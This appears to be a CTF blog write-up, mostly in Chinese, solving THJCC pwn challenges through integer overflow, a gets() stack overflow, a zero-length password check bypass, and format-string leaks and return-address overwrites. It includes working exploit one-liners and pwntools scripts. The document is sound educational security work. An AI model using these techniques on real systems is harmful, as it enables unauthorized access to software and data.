---
title: THJCC CTF pwn writeup
published: 2025-04-22 02:45:00
description: ''
image: ''
tags: ['pwn']
category: 'CTF'
draft: false 
lang: ''
---

> 比賽時 pwn 的題目並沒有寫完全部（5/7），若後續有解出來會再補上。

## Flag Shoping

It's the FLAG SHOP!!! Let's go buy some flags!!!

> Author: Grissia

`nc chal.ctf.scint.org 10101`

Files：[source code](https://github.com/yuto0226/notes/blob/main/src/content/posts/thjcc-ctf-pwn/flag_shopping.c)

### Solution

這一題是典型的 interger overflow 題，使用者可以選擇購買商品、輸入購買數量 `(long long)num`，而用來儲存持有金錢的 `money` 又是 `int` 型別。第 43 行在扣錢時，又將 `num` 轉型成 `int`，所以我們可以考慮以下攻擊流程：

- 輸入數量一個比 `INT_MAX` 大的數，讓第 43 行轉型別時會變成負數。在減法時就會**負負得正**。
- 重複以上動作直到持有金錢累計大於購買 flag 的金額 123456789。

所以我們的目標是讓 `money` 比原先多 123456789 - 100 = 123456689。

如果輸入的數字是 `INT_MAX` + 1 的話，型別轉換後會變成 `INT_MIN`，乘上 25 後就會再次 overflow 讓 `money` 變成負數。

```
> 1
> 2147483648
> 3
> 1
You only have -2147483548, But it cost 123456789 * 1 = 123456789
...
```

會導致這樣是因為原本 money 裡面有 100 元，所以就只要把輸入加上 100 / 25 = 4 後，應該就可以扣掉多餘的錢避免 overflow。但經測試之後要再加上 1 才夠。

## Money Overflow

I'm so poor that I can't afford to eat. I really wish I had a rich little sister to save me QQ

> Author: Dr.dog

`nc chal.ctf.scint.org 10001`

Files：[source code](https://github.com/yuto0226/notes/blob/main/src/content/posts/thjcc-ctf-pwn/money_overflow.c)

### Solution

這題就是簡單的 stack overflow 題，使用者的資訊會被存在一個 `struct` 裡面：

```c
struct {
  int id;
  char name[20];
  unsigned short money;
} customer;
```

而程式一開始就用不安全的函式讀，取使用者的輸入到 `customer.name`。這就給了我們利用的機會，只要填滿 `name` 後，就可以覆蓋到 `money` 的值。

```c
customer.id = 1;
customer.money = 100;
printf("Enter your name: ");
gets(customer.name);
```

而題目要求要 65535 才能拿到 shell，因此只要蓋 `\xff\xff` 就可以了。

```zsh
echo -e 'AAAAAAAAAAAAAAAAAAAA\xff\xff\n5\ncat flag.txt' | nc chal.ctf.scint.org 10001
```

## Insecure Shell

SSH is outdated<br>
ISSH is a more convenient alternative

> Author: Dr.dog

`nc chal.ctf.scint.org 10004`

Files：[source code](https://github.com/yuto0226/notes/blob/main/src/content/posts/thjcc-ctf-pwn/insecure_shell.c)

### Solution

這題會從 `/dev/urandom` 取出一段 15 bytes 的密碼，使用者必須輸入正確的密碼才能拿到 shell。但仔細閱讀程式碼，可以發現 `check_password()` 傳入的長度是使用者可控的，而不是密碼長度 15。

```c
check_password(password, buf, strlen(buf))
```

因此可以直接輸入一個長度 0 的字串繞過檢查，並拿到 shell。

```zsh
echo -e '\x00\ncat ../flag.txt' | nc chal.ctf.scint.org 10004
```

## Once

Are you sure you want to bet your life on winning this game in one chance?

![hyakusetsufuto](https://i.pinimg.com/736x/a4/5f/02/a45f02340a7bceef28ad678c5cd6507f.jpg)

> Author: Dr.dog

`nc chal.ctf.scint.org 10002`

Files：[source code](https://github.com/yuto0226/notes/blob/main/src/content/posts/thjcc-ctf-pwn/once.c)

### Solution

這一題是 format string 題，可以在程式碼中看到 `printf(buf)` 這種標誌型的特徵。程式一開始會隨機生成 `secret` 的內容，並在使用者輸入相同的字串時才能拿到 shell。既然是 format string，我們就可以嘗試 leak 出 `secret` 的內容。

```py
io.sendline(b"%8$p.%9$p")
    
io.recvuntil(b"Your guess: ")
high = io.recvuntil(b".").strip(b".")
high = int(high, 16)
low = io.recvuntil(b"\n").strip(b"\n")
low = int(low, 16)

secret =  p64(high) + p64(low)
info("secret: " + secret.decode());

io.sendline(b"n")

io.sendline(secret.strip(b"\x00"))
io.sendline(b"y")

io.sendline(b"cat ../flag.txt")
sleep(0.5)

io.recvuntil(b"answer!\n")
io.interactive()
io.close()
```

## Little Parrot

I'm a little parrot, and I'll repeat whatever you said!

> Author: Grissia

`nc chal.ctf.scint.org 10103`

Files：[source code](https://github.com/yuto0226/notes/blob/main/src/content/posts/thjcc-ctf-pwn/little_parrot.c)

### Solution

這一題也可以看到 format string 的漏洞，問題在於要怎麼跳到 `win()`。我的作法是 leak 出 stack 和 .text 段的 address，計算 offset 後用 format string 再寫入 return address 的指標。

```py
io.sendline(b"%40$p.%41$p")  # prev frame addr
io.recvuntil(b"You said > ")

prev_rbp = io.recvuntil(b".").strip(b".")
info("prev_rbp: " + prev_rbp.decode())

ret_addr = io.recvline().strip()
info("ret_addr: " + ret_addr.decode())

ptr_ret_addr = int(prev_rbp, 16) - frame_offset
info("ptr_ret_addr: " + hex(ptr_ret_addr))

win_addr = int(ret_addr, 16) - win_offset
info("win_addr: " + hex(win_addr))

info(hex(ptr_ret_addr + 4) + " -> win_addr: " + hex(win_addr))

payload = fmtstr_payload(
    offset=6,
    writes={
        ptr_ret_addr: win_addr,
    },
    write_size='short',
)

info(b"payload: " + payload)

io.sendline(payload)

io.sendline(b"exit")
io.interactive()
io.close()
```

## Bank Clerk

Do you know what the "Principle of Least Privilege" is? But what if I can control the system even through I'm just a bank clerk?

> Author: Dr.dog

`nc chal.ctf.scint.org 10003`

## Painter

I created a stack structure to store my artwork:D

> Author: Dr.dog

`nc chal.ctf.scint.org 10006`
